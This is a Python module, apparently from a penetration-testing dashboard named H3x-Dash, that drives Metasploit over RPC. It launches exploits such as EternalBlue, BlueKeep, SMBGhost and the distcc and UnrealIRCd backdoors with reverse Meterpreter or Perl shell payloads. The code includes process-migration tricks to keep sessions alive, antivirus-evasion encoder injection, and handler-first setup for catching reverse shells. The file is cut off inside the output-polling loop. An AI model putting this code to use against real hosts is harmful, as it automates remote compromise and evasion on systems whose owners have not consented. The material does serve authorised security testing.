"""
H3x-Dash MsfEngine
Thread-safe wrapper around pymetasploit3's MsfRpcClient.
Includes socket pre-check, SSL auto-detection, and background
reconnect loop so H3x-Dash keeps trying until msfrpcd is up.

Start msfrpcd (no SSL) before launching H3x-Dash:
    msfrpcd -P msfrpc -S -f
"""
import socket
import threading
import time


# How long to wait for a TCP connection to msfrpcd (seconds)
_CONNECT_TIMEOUT = 5

# Seconds between auto-reconnect attempts
_RETRY_INTERVAL  = 10


# ── Fragile exploits that benefit from stager-level migration ─────────────────
# Kernel-injection exploits (EternalBlue family, BlueKeep) land their payload in
# an unstable host process that frequently dies seconds after — and often DURING
# meterpreter staging, before any post-session migration can fire. The robust
# fix is PrependMigrate: a payload-stager option that migrates into a fresh,
# stable process BEFORE meterpreter loads. The stager spawns its target process,
# moves into it, and only then pulls down meterpreter — so the unstable host
# process is abandoned before meterpreter ever lives there. This is the standard
# operator mitigation for the "session opened then died" pattern.
_FRAGILE_EXPLOIT_MARKERS = (
    'ms17_010_eternalblue',
    'eternalblue',
    'ms17_010',          # covers eternalblue variants; psexec lands in a clean
                         # service but the prepend is harmless there
    'cve_2019_0708',     # BlueKeep — RDP kernel UAF, very unstable session
    'bluekeep',
    'cve_2020_0796',     # SMBGhost — SMBv3 kernel
    'smbghost',
)
# Stager-level migration SPAWNS a fresh process, so naming a process here is
# safe — PrependMigrate creates it before meterpreter loads.
_PREPEND_MIGRATE_PROC = 'rundll32.exe'
# Post-session migration for stageless payloads MUST spawn its own process.
# Migrating by existing-process-name fails when that process isn't already
# running — rundll32 is transient and explorer only exists at an interactive
# logon, so on a freshly-booted Win7 the migrate silently fails and meterpreter
# stays in the dying kernel-injected host (the "session opened then died"
# pattern). post/windows/manage/migrate spawns a new host (notepad.exe by
# default) and migrates into it, reliable regardless of target state.
_MIGRATE_POST_MODULE = 'post/windows/manage/migrate'

_CURATED_DEFAULT_PAYLOADS = {
    # Kernel SMB exploits: use the STAGED x64 reverse Meterpreter. This is the
    # module's own default and is always compatible. The stageless variant
    # (meterpreter_reverse_tcp) is rejected as "not valid" on some MSF builds
    # for this exploit's compatible-payload list, so we do not force it.
    # Session survival is handled by PrependMigrate (spawns a fresh host at the
    # stager level) + EXITFUNC thread, not by payload choice.
    'exploit/windows/smb/ms17_010_eternalblue':
        'windows/x64/meterpreter/reverse_tcp',
    'exploit/windows/smb/cve_2020_0796_smbghost':
        'windows/x64/meterpreter/reverse_tcp',
    # Metasploitable cmd-exec classics — reverse_perl is MSF-compatible on
    # distcc_exec; reverse_bash /dev/tcp and reverse_netcat_gaping are not.
    'exploit/unix/misc/distcc_exec':
        'cmd/unix/reverse_perl',
    'exploit/unix/irc/unreal_ircd_3281_backdoor':
        'cmd/unix/reverse_perl',
    'exploit/multi/samba/usermap_script':
        'cmd/unix/reverse_perl',
}

# distcc/IRC fire the callback before the module's internal handler() runs.
# Arm exploit/multi/handler as a background job first so LHOST:LPORT is
# listening when the one-liner executes — prevents open-then-die sessions.
_HANDLER_FIRST_EXPLOITS = (
    'exploit/unix/misc/distcc_exec',
    'exploit/unix/irc/unreal_ircd_3281_backdoor',
)

# Payloads MSF accepts per module (for rejection diagnostics).
_MODULE_COMPATIBLE_PAYLOADS: dict[str, list[str]] = {
    'exploit/unix/misc/distcc_exec': [
        'cmd/unix/reverse_perl',
        'cmd/unix/reverse',
        'generic/shell_reverse_tcp',
        'cmd/unix/bind_perl',
    ],
}

# Adaptive fallback after repeated session deaths. Kept as the same staged
# payload (the stageless variant is not universally accepted for these modules);
# the real adaptation is escalated migration + EXITFUNC, applied at launch.
_ADAPTIVE_STAGELESS_PAYLOADS = {
    'exploit/windows/smb/ms17_010_eternalblue':
        'windows/x64/meterpreter/reverse_tcp',
    'exploit/windows/smb/cve_2020_0796_smbghost':
        'windows/x64/meterpreter/reverse_tcp',
}


def _is_fragile_exploit(module: str) -> bool:
    m = (module or '').lower()
    return any(marker in m for marker in _FRAGILE_EXPLOIT_MARKERS)


def _curated_default_payload(module: str) -> str | None:
    """Return a known-compatible payload for modules where blank is risky."""
    m = (module or '').lower()
    for needle, payload in _CURATED_DEFAULT_PAYLOADS.items():
        if needle in m:
            return payload
    return None


def _is_cmd_reverse_payload(payload: str | None) -> bool:
    pl = (payload or '').lower()
    return pl.startswith('cmd/unix/') and 'reverse' in pl


def _needs_handler_first(module: str, payload: str | None) -> bool:
    return (_is_cmd_reverse_payload(payload)
            and any(marker in (module or '')
                    for marker in _HANDLER_FIRST_EXPLOITS))


def _append_datastore_options(commands: list[str], options: dict,
                              skip: tuple[str, ...] = ()) -> None:
    for k, v in (options or {}).items():
        if k in skip or v in (None, ''):
            continue
        commands.append(f'set {k} {v}')


def _is_stageless_payload(payload: str) -> bool:
    """
    True for single-file payloads like windows/x64/meterpreter_reverse_tcp.
    PrependMigrate is a *stager* option and has no effect on these — they
    need InitialAutoRunScript instead.
    """
    pl = (payload or '').lower()
    if not pl.startswith('windows/'):
        return False
    return '/meterpreter/' not in pl and 'meterpreter_' in pl


def _migrate_autorun_script(death_count: int = 0) -> str:
    """
    Spawn-and-migrate AutoRunScript for stageless payloads. Always spawns a
    fresh host process and migrates into it, so it never depends on a process
    already running on the target — the failure mode behind repeated EternalBlue
    session deaths. death_count is accepted for future tuning; the spawn-based
    approach is reliable from the first attempt.
    """
    return _MIGRATE_POST_MODULE


def _first_rhost(rhosts) -> str:
    """Normalize RHOSTS to the first host token for per-target adaptation."""
    return str(rhosts or '').split(',')[0].strip().lower()


def _port_open(host: str, port: int, timeout: float = _CONNECT_TIMEOUT) -> bool:
    """Quick TCP reachability check — avoids hanging the whole app."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


class MsfEngine:

    def __init__(self):
        self._client    = None
        self._connected = False
        self._version   = None
        self._lock         = threading.Lock()
        self._exploit_lock = threading.Lock()   # prevents concurrent exploit launches
        self._retry_thr = None        # background reconnect thread
        self._stop_retry = threading.Event()
        self._last_error = None       # last connection error string
        # session_id -> {module, rhost} for newly-opened sessions
        self._session_origin: dict[str, dict] = {}
        # (module, rhost) -> dead-session count
        self._dead_session_counts: dict[tuple[str, str], int] = {}
        self._session_state_lock = threading.Lock()

    # ── Connection ────────────────────────────────────────────────────────────

    def connect(self, host='127.0.0.1', port=55553, password='msfrpc', ssl=False) -> dict:
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
        except ImportError:
            return {
                'status':  'error',
                'message': (
                    'pymetasploit3 not installed. Install on Kali: '
                    'sudo apt-get install python3-pymetasploit3  '
                    '(or pip install pymetasploit3 --break-system-packages '
                    'if the apt package is unavailable in your Kali version)'
                ),
            }

        # ── 1. TCP reachability check ─────────────────────────────────────────
        if not _port_open(host, port):
            msg = (
                f'Cannot reach {host}:{port} — '
                'is msfrpcd running?  Start it with: '
                'msfrpcd -P msfrpc -S -f'
            )
            with self._lock:
                self._connected = False
                self._last_error = msg
            return {'status': 'error', 'message': msg}

        # ── 2. Try to authenticate ────────────────────────────────────────────
        #    pymetasploit3 uses requests under the hood; when msfrpcd was started
        #    with -S (no SSL) we must pass ssl=False explicitly AND the library
        #    must not override it.  We try no-SSL first, then SSL as a fallback.
        attempts = [(False, 'no-SSL'), (True, 'SSL')]
        if ssl:
            attempts = [(True, 'SSL'), (False, 'no-SSL')]

        last_exc = None
        for use_ssl, label in attempts:
            try:
                client  = MsfRpcClient(
                    password,
                    server = host,
                    port   = port,
                    ssl    = use_ssl,
                )
                version = client.core.version      # ping — raises if auth fails
                with self._lock:
                    self._client    = client
                    self._version   = version
                    self._connected = True
                    self._last_error = None
                print(f'[H3x-Dash] MSF RPC connected ({label}) — {version}')
                return {'status': 'connected', 'version': version}
            except Exception as exc:
                last_exc = exc
                continue

        msg = f'Auth failed ({host}:{port}): {last_exc}'
        with self._lock:
            self._connected  = False
            self._client     = None
            self._last_error = msg
        return {'status': 'error', 'message': msg}

    def _client_ref(self):
        """
        Snapshot self._client under the lock and return it.
        Callers use the returned reference for RPC calls — safe because even
        if disconnect() sets self._client = None on another thread, the
        snapshot still holds the original object reference.
        Returns None if not connected.
        """
        with self._lock:
            return self._client if self._connected else None

    def _adaptive_payload_for(self, module: str, rhosts) -> tuple[str | None, int]:
        """Return (payload, death_count) for adaptive stageless fallback."""
        module_key = (module or '').lower()
        candidate = _ADAPTIVE_STAGELESS_PAYLOADS.get(module_key)
        if not candidate:
            return None, 0
        key = (module_key, _first_rhost(rhosts))
        with self._session_state_lock:
            deaths = self._dead_session_counts.get(key, 0)
        if deaths > 0:
            return candidate, deaths
        return None, 0

    def _remember_session_origin(self, sessions: list, module: str, rhosts) -> None:
        """Link newly-opened session IDs back to module+target context."""
        module_key = (module or '').lower()
        rhost_key = _first_rhost(rhosts)
        if not module_key or not rhost_key:
            return
        with self._session_state_lock:
            for s in sessions or []:
                sid = str(s.get('id', '')).strip()
                if sid:
                    self._session_origin[sid] = {
                        'module': module_key,
                        'rhost': rhost_key,
                    }

    def _note_dead_session(self, session_id: str) -> tuple[str | None, str | None, int]:
        """
        Mark one dead session for its originating module+target.
        Returns (module, rhost, count) or (None, None, 0) if unknown.
        """
        sid = str(session_id).strip()
        if not sid:
            return None, None, 0
        with self._session_state_lock:
            origin = self._session_origin.pop(sid, None)
            if not origin:
                return None, None, 0
            key = (origin.get('module', ''), origin.get('rhost', ''))
            self._dead_session_counts[key] = self._dead_session_counts.get(key, 0) + 1
            count = self._dead_session_counts[key]
        return key[0], key[1], count

    def disconnect(self):
        self._stop_retry.set()          # kill retry thread if running
        with self._lock:
            self._client    = None
            self._connected = False
            self._version   = None

    def is_connected(self) -> bool:
        return self._connected and self._client is not None

    def get_version(self) -> str | None:
        return self._version

    def get_last_error(self) -> str | None:
        return self._last_error

    def get_session_count(self) -> int:
        return len(self.list_sessions())

    # ── Auto-reconnect ────────────────────────────────────────────────────────

    def start_auto_connect(self, host='127.0.0.1', port=55553,
                           password='msfrpc', ssl=False):
        """
        Spawn a background thread that keeps trying to connect until it
        succeeds.  Safe to call multiple times — only one thread runs.
        """
        if self._retry_thr and self._retry_thr.is_alive():
            return  # already running

        self._stop_retry.clear()
        self._retry_thr = threading.Thread(
            target   = self._reconnect_loop,
            args     = (host, port, password, ssl),
            daemon   = True,
            name     = 'h3x-msf-autoconnect',
        )
        self._retry_thr.start()

    def _reconnect_loop(self, host, port, password, ssl):
        attempt = 0
        while not self._stop_retry.is_set():
            if self.is_connected():
                # Already up — just health-check every _RETRY_INTERVAL seconds
                try:
                    _c = self._client_ref()
                    if _c is None:
                        raise RuntimeError('client is None')
                    _ = _c.core.version
                except Exception:
                    with self._lock:
                        self._connected = False
                        self._client    = None
                    print('[H3x-Dash] MSF RPC connection lost — retrying...')
                self._stop_retry.wait(_RETRY_INTERVAL)
                continue

            attempt += 1
            print(f'[H3x-Dash] MSF RPC connect attempt {attempt} '
                  f'({host}:{port}) ...')
            result = self.connect(host=host, port=port,
                                  password=password, ssl=ssl)
            if result['status'] == 'connected':
                print(f'[H3x-Dash] MSF RPC online — {result.get("version","")}')
                # Stay in loop to health-check, but slow down
                self._stop_retry.wait(_RETRY_INTERVAL)
            else:
                print(f'[H3x-Dash] MSF RPC unavailable — '
                      f'{result.get("message","")}  '
                      f'(retry in {_RETRY_INTERVAL}s)')
                self._stop_retry.wait(_RETRY_INTERVAL)

    # ── Module search ─────────────────────────────────────────────────────────

    def search(self, query: str) -> list:
        client = self._client_ref()
        if client is None:
            return []
        try:
            raw = client.modules.search(query)
            return [
                {
                    'fullname':    m.get('fullname', ''),
                    'type':        m.get('type', ''),
                    'rank':        m.get('rank', ''),
                    'description': m.get('description', ''),
                }
                for m in (raw or [])[:50]
            ]
        except Exception as e:
            return [{'error': str(e)}]

    # ── Exploit execution ─────────────────────────────────────────────────────

    def run_exploit(self, module: str, options: dict, payload: str = None,
                    target: int = None, action: str = 'run',
                    poll_timeout: int = 60, auto_migrate=None) -> dict:
        """
        Dispatch an exploit/auxiliary/post module via msfrpcd.

        Args:
            module:       full module path (e.g. exploit/windows/smb/ms17_010_eternalblue)
            options:      dict of options (RHOSTS, RPORT, LHOST, LPORT, etc.)
            payload:      payload module path, or None for module default
            target:       target index (None = module default, usually 0)
            action:       'run' to exploit, 'check' to test vuln without exploiting
            poll_timeout: max seconds to wait for console to go idle (default 60)
            auto_migrate: harden fragile exploits by migrating the session out of
                          its host process the instant it opens. None = auto
                          (on for kernel-injection exploits like eternalblue,
                          off otherwise). True/False to force.

        Returns a dict with status, result (the wrapper log), console_output
        (raw MSF output), sessions (new sessions opened), and outcome flags
        (exploit_failed, check_vulnerable, check_safe).
        """
        client = self._client_ref()
        if client is None:
            return self._finish_exploit_run(
                module, options, payload, target, action, poll_timeout, auto_migrate,
                {'status': 'error', 'message': 'Not connected to Metasploit RPC'})
        if not module:
            return self._finish_exploit_run(
                module, options, payload, target, action, poll_timeout, auto_migrate,
                {'status': 'error', 'message': 'No module specified'})

        # Prevent concurrent exploit launches on the same RPC connection.
        if not self._exploit_lock.acquire(blocking=False):
            return self._finish_exploit_run(
                module, options, payload, target, action, poll_timeout, auto_migrate,
                {'status': 'error',
                 'message': 'An exploit is already running — wait for it to complete'})
        try:
            result = self._run_exploit_inner(client, module, options or {},
                                             payload, target, action, poll_timeout,
                                             auto_migrate)
            return self._finish_exploit_run(
                module, options, payload, target, action, poll_timeout, auto_migrate,
                result)
        finally:
            self._exploit_lock.release()

    @staticmethod
    def _finish_exploit_run(module, options, payload, target, action, poll_timeout,
                            auto_migrate, result: dict) -> dict:
        """Persist exploit run to logs/exploit/ — never raises."""
        try:
            from modules.ops_log import ops_log
            ops_log.log_exploit_run(
                module=module,
                options=options or {},
                payload=payload,
                target=target,
                action=action or 'run',
                auto_migrate=auto_migrate,
                poll_timeout=poll_timeout,
                result=result,
            )
        except Exception:
            pass
        return result

    def _run_exploit_inner(self, client, module: str, options: dict,
                           payload: str = None, target: int = None,
                           action: str = 'run', poll_timeout: int = 60,
                           auto_migrate=None) -> dict:
        """
        Run a module via the msfrpcd consoles API.

        Why console-based: client.modules.use() + module.execute() dispatches
        the exploit but DOESN'T capture the runtime output ("Selected Target",
        "Sending stage", "Exploit failed: ..."). The consoles API runs commands
        through a real msf6 console where every line is visible. That's the
        difference between debuggable and undebuggable.

        Also fixes the LHOST/LPORT drop bug: setting them on the console
        datastore makes them available to the module's *default* payload —
        no need to choose an explicit payload just to set a callback address.
        """
        log = []
        L = lambda line='': log.append(line)

        # ── Layer evasion options into the datastore ──────────────────────
        # If the operator has selected a stealth level on the dashboard,
        # MSF encoder + stage-encoding options get injected here. Operator-
        # supplied options take precedence (their explicit ENCODER overrides
        # the evasion-profile default), so this is non-intrusive.
        try:
            from modules import evasion as _evasion
            evasion_opts = _evasion.msf_options_for()
            # Only inject for exploits; aux/post modules don't take encoders
            is_exploit = (module or '').startswith('exploit/')
            if evasion_opts and is_exploit:
                merged = dict(evasion_opts)
                merged.update(options or {})       # operator wins on conflict
                options = merged
                profile = _evasion.level_profile()
                if profile['level'] > 0:
                    L(f'STEALTH  : {profile["name"]} (level {profile["level"]}) '
                      f'— {evasion_opts.get("ENCODER", "no encoder")} '
                      f'× {evasion_opts.get("EncoderItr", 0)} iterations')
        except Exception as _ex:
            pass    # never let evasion config break exploit dispatch

        # ── Parse module type ─────────────────────────────────────────────
        _VALID_TYPES = ('exploit', 'auxiliary', 'post', 'payload', 'evasion')
        _mod_parts   = module.split('/')
        _mod_type    = _mod_parts[0] if _mod_parts and _mod_parts[0] in _VALID_TYPES else 'exploit'
        _mod_name    = '/'.join(_mod_parts[1:]) if len(_mod_parts) > 1 else module

        # ── Curated payload default for fragile reverse-session exploits ──
        # If the UI/operator leaves PAYLOAD blank, MSF may still choose a
        # reverse payload internally. That used to bypass our LHOST validation
        # and PrependMigrate hardening because h3x-dash could not see the
        # implicit payload name. For x64-native kernel SMB exploits, make the
        # payload explicit before validation and hardening.
        _verb = action if action in ('check', 'run', 'exploit') else 'run'
        if not payload and _verb in ('run', 'exploit') and _mod_type == 'exploit':
            adaptive_payload, deaths = self._adaptive_payload_for(
                module, options.get('RHOSTS', '')
            )
            if adaptive_payload:
                payload = adaptive_payload
                L(f'[*] Payload auto-selected (adaptive): {payload}')
                L(f'    (prior session-died events detected for this target: '
                  f'{deaths}; preferring stageless)')
            else:
                curated_payload = _curated_default_payload(module)
                if curated_payload:
                    payload = curated_payload
                    L(f'[*] Payload auto-selected: {payload}')
                    L('    (curated default for this module; needed for '
                      'LHOST validation and session hardening)')

        # ── Auto-correct known wrong RPORTs ───────────────────────────────
        # Some modules MUST use a specific port regardless of which port
        # triggered the suggestion. ms17_010_* exploits SMBv1 on 445 — if the
        # UI pre-filled 139 (NetBIOS, the other SMB-ish port) the exploit will
        # connect but the SMBv1 negotiation fails and you get a confusing
        # "exploit completed but no session". Force the correct port and tell
        # the operator we did.
        FORCE_RPORT = {
            'ms17_010_eternalblue': '445',
            'ms17_010_psexec':      '445',
            'ms17_010':             '445',
            'cve_2020_0796':        '445',   # SMBGhost
        }
        for needle, correct in FORCE_RPORT.items():
            if needle in (module or '') and str(options.get('RPORT', '')) not in ('', correct):
                wrong = options.get('RPORT')
                options = dict(options)
                options['RPORT'] = correct
                L(f'[!] RPORT auto-corrected {wrong} → {correct} '
                  f'({needle} requires SMB on {correct}, not {wrong})')
                break

        # ── Pre-flight banner ─────────────────────────────────────────────
        L(f'MODULE   : {module}')
        L(f'ACTION   : {action}')
        L(f'TARGET   : {options.get("RHOSTS","?")} : {options.get("RPORT","?")}')
        if target is not None:
            L(f'TGT IDX  : {target}')
        L(f'PAYLOAD  : {payload or "(module default)"}')
        lhost = options.get('LHOST', '')
        lport = options.get('LPORT', '')
        if lhost:
            L(f'HANDLER  : {lhost} : {lport or "4444 (default — set automatically)"}')
        else:
            L(f'HANDLER  : (no LHOST set — reverse payloads will FAIL)')
        extra = {k: v for k, v in (options or {}).items()
                 if k not in ('RHOSTS', 'RPORT', 'LHOST', 'LPORT')}
        if extra:
            L(f'OPTIONS  : {extra}')
        L()

        # ── Validate module via module RPC (lightweight — doesn't execute) ─
        # If pymetasploit3 chokes loading metadata, we DON'T bail — the
        # console-based execution that follows works without test_mod. Skip
        # pre-flight, log the limitation, continue.
        #
        # But IF .use() returns None/unusable (no exception), that means the
        # module truly doesn't exist — bail with a clear error.
        L(f'[*] Validating module... ({_mod_type})')
        test_mod = None
        load_failed_gracefully = False     # exception we degraded past
        try:
            test_mod = client.modules.use(_mod_type, _mod_name)
        except (TypeError, KeyError) as exc:
            if 'subscriptable' in str(exc) or 'iterable' in str(exc):
                # pymetasploit3 trips on malformed module.compatible_payloads
                # responses for some exploit modules. Known library quirk,
                # not an msfrpcd bad state. Auxiliary modules don't hit this
                # because they skip the compatible_payloads RPC call.
                L(f'[!] pymetasploit3 cannot parse {module} metadata — '
                  f'skipping pre-flight')
                L(f'    (library threw: {type(exc).__name__}: {exc})')
                L(f'    Known compatibility quirk between pymetasploit3 and')
                L(f'    some MSF versions when enumerating compatible payloads.')
                L(f'    Module will still fire via console — missing options')
                L(f'    will surface in MSF output instead of pre-flight.')
                L(f'')
                load_failed_gracefully = True
                test_mod = None
                # Fall through to console execution
            else:
                L(f'[ERROR] Module load raised: {type(exc).__name__}: {exc}')
                return {'status': 'error',
                        'message': f'Module load failed: {exc}',
                        'result':  '\n'.join(log)}
        except Exception as exc:
            L(f'[ERROR] Module load raised: {exc}')
            return {'status': 'error',
                    'message': f'Module load failed: {exc}',
                    'result':  '\n'.join(log)}

        # Module truly not found: .use() returned no usable object AND no
        # graceful-degradation exception fired. Bail with the same diagnostic
        # message we've always shown for missing modules.
        if not load_failed_gracefully and (
            not test_mod or not hasattr(test_mod, 'options')):
            L(f'[ERROR] Module not loaded: {module}')
            L(f'  msfrpcd did not return a usable module for')
            L(f'    type:  {_mod_type}')
            L(f'    path:  {_mod_name}')
            L(f'  Verify it exists:  msfconsole -q -x "use {module}; exit"')
            L(f'  Or:                grep -r "{_mod_name}" /usr/share/metasploit-framework/modules/')
            return {'status': 'error',
                    'message': f'Module not found: {module}',
                    'result':  '\n'.join(log)}

        # Inspect metadata only when we have a working test_mod
        if test_mod is not None:
            try:
                L(f'[*] Rank      : {test_mod.rank}')
                tgt_list = list(getattr(test_mod, 'targets', []) or [])
                L(f'[*] Targets   : {len(tgt_list)}')
                if tgt_list:
                    show_count = min(6, len(tgt_list))
                    for i in range(show_count):
                        marker = '←' if i == (target if target is not None else 0) else ' '
                        L(f'    [{i}]{marker} {tgt_list[i]}')
                    if len(tgt_list) > show_count:
                        L(f'    ... +{len(tgt_list) - show_count} more')
                        L(f'    (override default with the TARGET field if your OS')
                        L(f'     doesn\'t match target 0 — wrong target is the #1')
                        L(f'     cause of "exploit ran but no session")')
            except Exception:
                pass

        # ── Validate ONLY the critical no-default options before firing ───
        # History lesson: pymetasploit3's option metadata is unreliable as a
        # blocker. It has now produced false-positive "missing required" spam
        # three times — smb_login (39 framework options), then psexec
        # (CheckModule, which HAS a default of auxiliary/scanner/smb/smb_ms17_010
        # that pymetasploit3's runopts simply didn't surface).
        #
        # The lesson: MSF itself applies module defaults at run time. We should
        # NOT try to second-guess which options have defaults — MSF knows. We
        # only block on the tiny set of options that genuinely never have a
        # default AND that MSF cannot infer:
        #     RHOSTS / RHOST — the target. No module ships a default target.
        #     LHOST          — callback address for reverse payloads.
        # Everything else (CheckModule, SMB::*, NTLM::*, THREADS, ...) is left
        # to MSF, which fills defaults automatically when the module runs.
        CRITICAL_NO_DEFAULT = {'RHOSTS', 'RHOST'}
        provided_upper = {k.upper() for k, v in options.items()
                          if v not in (None, '')}

        missing_critical = []
        # Target is always required (unless this is a purely local/post module).
        if _mod_type not in ('post',):
            if not (provided_upper & CRITICAL_NO_DEFAULT):
                missing_critical.append('RHOSTS')

        # LHOST is required for reverse payloads — without it the callback has
        # nowhere to go. Detect reverse payloads by name.
        is_reverse = bool(payload and 'reverse' in payload.lower())
        if is_reverse and 'LHOST' not in provided_upper:
            missing_critical.append('LHOST')

        if missing_critical:
            L()
            L(f'[ERROR] Missing required option(s): {", ".join(missing_critical)}')
            for opt in missing_critical:
                hint = ('the target host — e.g. 192.168.1.43'
                        if opt == 'RHOSTS'
                        else 'your listener IP for the reverse callback')
                L(f'    {opt:<10} {hint}')
            L(f'  Set these in the options panel and re-launch.')
            return {'status': 'error',
                    'message': f'Missing required: {", ".join(missing_critical)}',
                    'result':  '\n'.join(log),
                    'missing_required': missing_critical}

        # ── Aux / post — strip payload + payload-only options ─────────────
        if _mod_type in ('auxiliary', 'post'):
            if payload:
                L(f'[!] {_mod_type} module — payload "{payload}" ignored')
                L(f'    Auxiliary and post modules do not deliver payloads;')
                L(f'    no session will result. Module writes findings to the')
                L(f'    MSF job console only.')
                payload = None
            for k in list(options.keys()):
                if k in ('LHOST', 'LPORT', 'EXITFUNC', 'EXITONSESSION'):
                    options.pop(k)

        # ── LPORT auto-default when LHOST set ─────────────────────────────
        # MSF will refuse to start a reverse handler without LPORT. Operator
        # often sets LHOST and forgets — silently default to 4444.
        if options.get('LHOST') and not options.get('LPORT'):
            options['LPORT'] = '4444'
            L('[*] LPORT auto-defaulted to 4444 (LHOST set, LPORT empty)')

        # ── Session baseline ──────────────────────────────────────────────
        try:
            sessions_before = {str(s.get('id', '')) for s in self.list_sessions()}
        except Exception:
            sessions_before = set()
        L(f'[*] Sessions before launch: {len(sessions_before)}')

        # ── Pre-flight: confirm target is actually reachable ──────────────
        # This catches the #2 cause of "exploit ran, no session" — the
        # operator firing against an unreachable IP (firewall, target down,
        # wrong RPORT). Cheap (~1s) and saves minutes of waiting on a
        # doomed exploit.
        rhosts_raw = options.get('RHOSTS', '')
        rport_raw  = options.get('RPORT', '')
        if rhosts_raw and rport_raw and _mod_type == 'exploit':
            # RHOSTS may be a comma-separated list — only test the first
            test_host = str(rhosts_raw).split(',')[0].strip()
            try:
                test_port = int(rport_raw)
                with socket.create_connection((test_host, test_port), timeout=3):
                    L(f'[*] Pre-flight: {test_host}:{test_port} TCP reachable')
            except (socket.timeout, socket.gaierror, ConnectionRefusedError, OSError) as exc:
                L(f'[!] Pre-flight: {test_host}:{test_port} NOT reachable ({exc})')
                L(f'    Continuing anyway — some exploits target ports that')
                L(f'    close immediately after probe. But if the target is')
                L(f'    down or behind a firewall, the exploit will time out.')
            except (TypeError, ValueError):
                L(f'[!] Pre-flight: RPORT {rport_raw!r} not parseable as int')
        L()

        # ── Create msfrpcd console for execution ──────────────────────────
        L('[*] Opening MSF console for execution...')
        try:
            console = client.consoles.console()
            cid     = console.cid
        except Exception as exc:
            L(f'[ERROR] Console creation failed: {exc}')
            return {'status': 'error',
                    'message': f'Console creation failed: {exc}',
                    'result':  '\n'.join(log)}

        L(f'[*] Console ready: cid={cid}')

        try:
            # Drain startup banner
            time.sleep(0.4)
            try:
                _ = console.read()
            except Exception:
                pass

            # Build command sequence
            handler_first = (_needs_handler_first(module, payload)
                             and _verb in ('run', 'exploit')
                             and _mod_type == 'exploit'
                             and options.get('LHOST'))
            if handler_first:
                lport = options.get('LPORT', '4444')
                commands = [
                    'use exploit/multi/handler',
                    f'set PAYLOAD {payload}',
                    f'set LHOST {options["LHOST"]}',
                    f'set LPORT {lport}',
                    'run -j',
                    f'use {module}',
                    f'set PAYLOAD {payload}',
                ]
                _append_datastore_options(commands, options)
                if target is not None:
                    commands.append(f'set TARGET {target}')
                commands.append('set DisablePayloadHandler true')
                commands.append('set WfsDelay 10')
                L('[*] Handler-first: background exploit/multi/handler before '
                  'exploit (distcc/IRC callback timing)')
                L('    DisablePayloadHandler on exploit — job handler catches '
                  'the reverse shell.')
            else:
                commands = [f'use {module}']
                if payload:
                    commands.append(f'set PAYLOAD {payload}')
                _append_datastore_options(commands, options)
                if target is not None:
                    commands.append(f'set TARGET {target}')
                if (any(marker in (module or '')
                        for marker in _HANDLER_FIRST_EXPLOITS)
                        and _verb in ('run', 'exploit')
                        and _mod_type == 'exploit'):
                    commands.append('set WfsDelay 10')

            # ── Session-survival hardening for fragile exploits ───────────────
            # None = auto (on for fragile kernel exploits). Staged payloads use
            # PrependMigrate (stager-level). Stageless payloads MUST use
            # InitialAutoRunScript — PrependMigrate has no effect on them.
            do_migrate = auto_migrate
            if do_migrate is None:
                do_migrate = _is_fragile_exploit(module)
            _payload_is_windows = bool(payload and payload.lower().startswith('windows/'))
            _, death_count = self._adaptive_payload_for(
                module, options.get('RHOSTS', ''))
            if (do_migrate and _verb in ('run', 'exploit')
                    and _mod_type == 'exploit' and _payload_is_windows):
                if _is_stageless_payload(payload):
                    autorun = _migrate_autorun_script(death_count)
                    commands.append(f'set InitialAutoRunScript {autorun}')
                    L(f'[*] Session hardening: spawn-and-migrate via {autorun}')
                    L('    (stageless payload — spawns a fresh host process and')
                    L('     migrates the instant the session opens. Spawn-based,')
                    L('     so it never depends on rundll32/explorer pre-existing)')
                else:
                    commands.append('set PrependMigrate true')
                    commands.append(
                        f'set PrependMigrateProc {_PREPEND_MIGRATE_PROC}')
                    L(f'[*] Session hardening: PrependMigrate → '
                      f'{_PREPEND_MIGRATE_PROC}')
                    L(f'    (stager migrates into {_PREPEND_MIGRATE_PROC} before '
                      f'meterpreter loads)')
            if (_is_fragile_exploit(module) and _verb in ('run', 'exploit')
                    and _mod_type == 'exploit' and _payload_is_windows):
                commands.append('set EXITFUNC thread')
                L('[*] EXITFUNC thread (reduces host-process teardown on fragile '
                  'kernel exploits)')

            # Run exploits foreground but NON-INTERACTING:
            #   -z  do not drop into session interaction when it opens
            # We deliberately do NOT use -j. A backgrounded job returns control
            # to the console immediately, printing a premature "Exploit
            # completed, but no session was created" while staging is still in
            # flight — and our output capture stops before the session lands.
            # Foreground -z blocks until the exploit truly finishes (full output,
            # real verdict) while never attaching the console to the session, so
            # destroying the console in the finally block can't disrupt it.
            if _verb in ('run', 'exploit') and _mod_type == 'exploit':
                exec_cmd = f'{_verb} -z'
                L('[*] Launch mode: foreground, no auto-interact (exploit -z)')
            else:
                exec_cmd = _verb
            commands.append(exec_cmd)

            # Send all commands
            for cmd in commands:
                try:
                    console.write(cmd + '\n')
                except Exception as exc:
                    L(f'[ERROR] console.write({cmd!r}) failed: {exc}')
                    raise
                # echo the command for clarity in the operator log
                # mask password-like values
                masked = cmd
                for sensitive in ('PASSWORD', 'PASS', 'SMBPass', 'BindPass'):
                    if sensitive in cmd:
                        prefix, _, _ = cmd.rpartition(' ')
                        masked = f'{prefix} ********'
                        break
                L(f'    msf6> {masked}')

            L()
            L('[*] Console output:')
            L('─' * 60)

            # Poll console for output until idle or timeout
            console_lines: list[str] = []
            start          = time.time()
            last_data_time = start
            # 8s of silence before declaring done — modern exploits routinely
            # have 5–10s pauses while staging, especially over slow links.
            # Old 3s threshold was exiting the poll loop before the session
            # was actually opened, returning "no session" on successful runs.
            IDLE_THRESHOLD = 8.0
            MIN_WAIT       = 3.0   # never exit before this even if 'idle'
            saw_any_data   = False

            # Compile prompt regex once — strips lines like 'msf6 (mod) >'
            # which are echoes of our own commands plus the empty prompt.
            import re as _re
            _PROMPT_RX = _re.compile(r'^msf\d*\s*(\([^)]*\))?\s*>\s*')

            while time.time() - start < poll_timeout:
                try:
                    resp = console.read()
                except Exception as exc:
                    L(f'[ERROR] console.read() failed: {exc}')
                    break

                data = resp.get('data', '') or ''
                busy = resp.get('busy', False)

                if data:
                    saw_any_data = True
                    for line in data.splitlines():
                        stripped = line.rstrip()
                        if not stripped:
                            continue
                        # Filter msf6 prompt echoes — operator already saw the
                        # commands listed in the wrapper log. Showing them
                        # again here just clutters the output.
                        if _PROMPT_RX.match(stripped):
                            continue
                        L(stripped)
                        console_lines.append(stripped)
                    last_data_time = time.time()

